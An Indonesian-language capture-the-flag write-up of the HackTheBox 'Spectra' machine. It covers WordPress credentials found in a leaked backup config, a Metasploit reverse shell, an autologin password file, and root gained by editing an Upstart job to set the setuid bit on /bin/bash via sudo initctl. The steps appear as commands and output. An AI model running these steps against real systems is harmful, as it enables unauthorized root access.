---
layout: post
title:  "HackTheBox: Spectra"
date:   2021-06-16 21:03:36 +0530
categories: [hackthebox]
tags: [mis-config, ssh, wordpress, initctl, setsuid]
---

Entah kenapa yang saya posting disini berkategori **miss-configuration** terus, bosen atuh. Tapi ya bodoamatin aja lah ya hehe. Dan btw, mesin kali ini dari [HackTheBox](https://www.hackthebox.eu/home/machines/profile/317) iseng iseng aja mulai dari yang easy dulu. Tapi ini gk kalah menarik, menarik dalam artian bagi saya sendiri sih di *HTB* bisa nyelesain 2 jam hehe. rekor terbaru.

## Machine Information

|**Details**|
|Name of Machine|**Spectra**|
|Difficulty Level|**Easy**|
|Date Released|**27 Feb 2021**|
|Date Retired|**26 Juny 2021**|
|Date I Completed it|**16 Juny 2021**|
|Radar Graph|![radar](https://i.postimg.cc/jdK08GJz/download.png)|

## Table of Contents

* [Reconnaissance](#recon)
    * [Ports](#nmap)
    * [Website - TCP 80](#website)
    * [spectra.htb](#spectra)
* [Shell as nginx](#nginx)
* [Shell as katie](#katie)
* [Privilege Escalation](#privesc)

## Reconnaissance {#recon}
## Ports {#nmap}
```cs
PORT     STATE SERVICE          REASON  VERSION
22/tcp   open  ssh              syn-ack OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDF1xom8Ljz30NltgYXTRoVI2ymBlBZn849bnFYNKwDgwvW9naxom8pe9mzV+I8pAb5AHeVdok7szaIke7nXINK5GdHw+P529fkRNfmq4V63RUmYNKeAZmfGubCQDwGHP0Gj8S/C1lCMp/9kdNPxDv8aamWTeVCTuqDOwMy0GmEGRyk9gaZjwA2T3kIVD/TjLVu5hkpwdoQHr0JYhJRqLKHqZqdcZY7vqUFuECqcgVZ0Sj52/VnT5lis+N3hZK1MqJW2vlPhdlXhESF2O2Z0gzVtnAMB8yT68pbcRUbl6OI0NC6ucKzSIb6g90vwF1kVlj22GXTcfu0r3tyCFlusJFnuhgAIrTax8eQu5W+vLAAM0pbMizVNOEzd4VtBpLBHunEkzDknUZn3k9X3XP9NsIReMW+T8XiLTSxZuve8EWdaIfXoAeUlj0Tsy2iwYfLk6XaO5xssZgHFvB4QnUvpdt2ybsfTEd1aySikuetak9pl7yECFD8jgqT6ybzG1qsTMsdsJz6o871al1r0Dyd76R0Dr3+dO7AhLJtPszZHJXK3YqCqF/qU6kNIPMTIXdiVEuYQ1JieYzyjN3CivzVUPFnvOu2+dD5kFQSQNqR8kHGRqZXW0oUQsDUh1GQsb+iO8sFMDIAqr1SfAKQEpCPpSFl6H1wtNHW8pJJNwj1FkKNXw==
80/tcp   open  http             syn-ack nginx 1.17.4
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql            syn-ack MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
8081/tcp open  blackice-icecap? syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 27 Jun 2021 10:07:04 GMT
|     Connection: close
|     Hello World
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 27 Jun 2021 10:07:03 GMT
|     Connection: close
|     Hello World
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 27 Jun 2021 10:07:10 GMT
|     Connection: close
|_    Hello World
|_mcafee-epo-agent: ePO Agent not found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8081-TCP:V=7.91%I=7%D=6/27%Time=60D84DCE%P=x86_64-unknown-linux-gnu
SF:%r(GetRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain
SF:\r\nDate:\x20Sun,\x2027\x20Jun\x202021\x2010:07:03\x20GMT\r\nConnection
SF::\x20close\r\n\r\nHello\x20World\n")%r(FourOhFourRequest,71,"HTTP/1\.1\
SF:x20200\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Sun,\x2027\x20J
SF:un\x202021\x2010:07:04\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20W
SF:orld\n")%r(HTTPOptions,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20t
SF:ext/plain\r\nDate:\x20Sun,\x2027\x20Jun\x202021\x2010:07:10\x20GMT\r\nC
SF:onnection:\x20close\r\n\r\nHello\x20World\n");
```

## Website - TCP 80 {#website}
![qqwswd](https://i.postimg.cc/jSBLJxLH/image.png)

simple, dan kedua link tsb merujuk kepada domain atau host `spectra.htb`. jadi saya tambahkan ke `/etc/hosts` dengan cara
```bash
echo "10.10.10.229 spectra.htb" >> /etc/hosts
```
after that, saya mencoba untuk mebruteforce directory web tapi tidak menemukan apa-apa.

## spectra.htb {#spectra}
**/main/index.php**
![asdfvasdzz](https://i.postimg.cc/yNz3b6sV/image.png)

Pada gambar tersebut sekilas normal menurut saya tidak ada yang menarik untuk di analisis lagi (anjay analisis). Tapi tulisan **Hello World** itu ternyata adalah sebuah postingan blog dengan nama author **administrator** confirmed by **wpscan**.

```bash
[i] User(s) Identified:

[+] administrator
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

**/testing/index.php**<br/>
![asdas](https://i.postimg.cc/wvRKRzRm/image.png)

Lalu saya melirik pada link kedua ini, terlihat membosankan coz of empty page. Dan menariknya ketika saya hilangkan **/index.php** ada sebuah tampilan semacam dirlist.

![dirlist](https://i.postimg.cc/tTqKD6cF/image.png)

rata-rata disitu hanya ada file yang berformat PHP dan file-file wordpress. dan menariknya pada gambar diatas juga terlihat **wp-config.php** yang dimana username dan password akan diletakkan pada file tersebut. bagaimanapun ada file lain yaitu **wp-config.php.save** yang dimana file ini mungkin juga saat ingin meng-edit sesuatu didalamnya ada kecelakaan crash pada **nano**.

ketika saya buka.
```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

## Shell as nginx {#nginx}
saya langsung buka metasploit, karena malas untuk ngedit file reverse shell berbentuk PHP dari **pentestMonkey** dan menguploadnya pada file **404.php** di wordpress spectra.

![herewego](https://i.postimg.cc/QtNM5Hky/image.png)

## Shell as katie {#katie}
saya mencoba melihat-lihat isi directory **/opt** iseng aja sih. eh taunya nemu ginian.
![ssass](https://i.postimg.cc/BnVWNt0z/image.png)

```bash
$ cat autologin.conf.orig
# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   "Automatic login at boot"
author        "chromium-os-dev@chromium.org"
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
  # Inject keys into the login prompt.
  #
  # For this to work, you must have already created an account on the device.
  # Otherwise, no login prompt appears at boot and the injected keys do the
  # wrong thing.
  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
end script

```
tanpa banyak gaya saya list dulu ke **/etc/autologin** apakah benar ada file **passwd**.

![damnbitch](https://i.postimg.cc/kgrKSvVY/image.png)

Dan yap we got it.

![damn](https://i.postimg.cc/28W0bwj3/image.png)

## PrivEsc {#privesc}

```bash
-bash-4.3$ id
uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
-bash-4.3$ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
-bash-4.3$ find / -type f -group developers 2>/dev/null
/etc/init/test6.conf
/etc/init/test7.conf
/etc/init/test3.conf
/etc/init/test4.conf
/etc/init/test.conf
/etc/init/test8.conf
/etc/init/test9.conf
/etc/init/test10.conf
/etc/init/test2.conf
/etc/init/test5.conf
/etc/init/test1.conf
/srv/nodetest.js
-bash-4.3$ sudo /sbin/initctl status test1
test1 stop/waiting
-bash-4.3$ sudo /sbin/initctl status test2
test2 stop/waiting
-bash-4.3$ sudo /sbin/initctl status test3
test3 start/running, process 5108
-bash-4.3$ sudo /sbin/initctl stop test3
test3 stop/waiting
```
> initctl allows a system administrator to communicate and interact with the Upstart init(8) daemon.


```js
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script
   
    exec chmod +s /bin/bash
    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
end script
```
Injecting SetUID pada konfigurasi di atas ke **/bin/bash** agar bisa di eskalasi ke tahap **root**.
dengan perintah **-p** yang berfungsi mepriviledges *bash*.

And boom.
```bash
bash-4.3$ sudo /sbin/initctl start test3
test3 start/running, process 18662
bash-4.3$ /bin/bash -p
bash-4.3# cd /root
bash-4.3# cat root.txt
d44519713b889d5e1f9e536d0c6df2fc
bash-4.3# 
```

## OS Mystery
```bash
bash-4.3# cat /etc/lsb-release
GOOGLE_RELEASE=87.3.41
CHROMEOS_RELEASE_BRANCH_NUMBER=85
CHROMEOS_RELEASE_TRACK=stable-channel
CHROMEOS_RELEASE_KEYSET=devkeys
CHROMEOS_RELEASE_NAME=Chromium OS
CHROMEOS_AUSERVER=https://cloudready-free-update-server-2.neverware.com/update
CHROMEOS_RELEASE_BOARD=chromeover64
CHROMEOS_DEVSERVER=https://cloudready-free-update-server-2.neverware.com/
CHROMEOS_RELEASE_BUILD_NUMBER=13505
CHROMEOS_CANARY_APPID={90F229CE-83E2-4FAF-8479-E368A34938B1}
CHROMEOS_RELEASE_CHROME_MILESTONE=87
CHROMEOS_RELEASE_PATCH_NUMBER=2021_01_15_2352
CHROMEOS_RELEASE_APPID=87efface-864d-49a5-9bb3-4b050a7c227a
CHROMEOS_BOARD_APPID=87efface-864d-49a5-9bb3-4b050a7c227a
CHROMEOS_RELEASE_BUILD_TYPE=Developer Build - neverware
CHROMEOS_RELEASE_VERSION=87.3.41
CHROMEOS_RELEASE_DESCRIPTION=87.3.41 (Developer Build - neverware) stable-channel chromeover64
```

